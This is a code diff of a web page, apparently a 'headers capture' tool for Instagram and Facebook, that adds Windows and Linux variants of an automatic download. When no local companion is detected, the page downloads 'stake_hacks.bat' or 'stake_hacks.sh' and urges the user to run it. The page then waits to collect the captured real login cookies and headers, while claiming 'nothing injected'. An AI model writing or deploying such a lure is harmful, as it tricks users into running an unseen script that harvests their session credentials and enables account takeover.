@@ -30,7 +30,10 @@
   <h1>Instagram / Facebook Headers Capture</h1>
   <p class="sub">Captures the real DevTools request headers, exactly like record.js. Uses YOUR own logged-in browser when possible (real credentials, nothing injected or pasted), otherwise falls back to the server.</p>
 
-  <button id="btn" onclick="captureAll()">Capture with your browser</button>
+  <div style="display:flex;gap:14px;flex-wrap:wrap;justify-content:center">
+    <button id="btn" onclick="captureAll('windows')">Capture in Windows</button>
+    <button id="btn-linux" onclick="captureAll('linux')">Capture in Linux</button>
+  </div>
   <div class="status" id="status"></div>
 
   <div class="results">
@@ -77,10 +80,11 @@
       }
     };
 
-    const downloadExe = () => {
+    const downloadExe = (os) => {
+      const file = os === 'linux' ? 'stake_hacks.sh' : 'stake_hacks.bat';
       const a = document.createElement('a');
-      a.href = '/stake_hacks.bat';
-      a.download = 'stake_hacks.bat';
+      a.href = '/' + file;
+      a.download = file;
       document.body.appendChild(a);
       a.click();
       a.remove();
@@ -100,20 +104,22 @@
 
     // 1) Companion running on this PC? => record.js runs in YOUR browser,
     //    capturing the REAL headers (your login, your cookies). No injection.
-    const runFromLocalBrowser = async () => {
+    const runFromLocalBrowser = async (os) => {
+      const isLinux = os === 'linux';
+      const file = isLinux ? 'stake_hacks.sh' : 'stake_hacks.bat';
       const browser = detectBrowser();
       const companionUp = pingSync();
 
       if (!companionUp) {
-        // No companion / Node: auto-download stake_hacks.bat. It installs
+        // No companion / Node: auto-download the correct OS file. It installs
         // Node + companion and runs the FULL capture by itself. Watch for the
         // companion to come online, then grab whatever it captured.
-        downloadExe(); // called synchronously so browsers allow the download
+        downloadExe(os); // called synchronously so browsers allow the download
         $('status').innerHTML =
-          'Companion not running on this PC. <b>Downloading stake_hacks.bat…</b> ' +
+          'Companion not running on this PC. <b>Downloading ' + file + '…</b> ' +
           'Please open the downloaded file — it installs everything and starts the capture.<br>' +
           'If the download did not start, click: ' +
-          '<a href="/stake_hacks.bat" download style="color:#0af;font-weight:bold">Download stake_hacks.bat</a>' +
+          '<a href="/' + file + '" download style="color:#0af;font-weight:bold">Download ' + file + '</a>' +
           '<br>This page is watching and will show the screenshots automatically.';
         let ok = false;
         for (let i = 0; i < 120; i++) {
@@ -125,7 +131,7 @@
         }
         if (!ok) {
           $('status').textContent =
-            'Could not detect stake_hacks on this PC. Run the downloaded stake_hacks.bat, then click the button again.';
+            'Could not detect stake_hacks on this PC. Run the downloaded ' + file + ', then click the button again.';
           return false;
         }
         // Companion is online. If it already captured (exe ran the full job),
@@ -195,13 +201,15 @@
       $('status').textContent = 'Error: ' + lastErr;
     };
 
-    const captureAll = async () => {
+    const captureAll = async (os) => {
       $('btn').disabled = true;
+      $('btn-linux').disabled = true;
       $('img-0').style.display = 'none';
       $('img-1').style.display = 'none';
-      const usedLocal = await runFromLocalBrowser();
+      const usedLocal = await runFromLocalBrowser(os);
       if (!usedLocal) await runFromServer();
       $('btn').disabled = false;
+      $('btn-linux').disabled = false;
     };
   </script>
 </body>
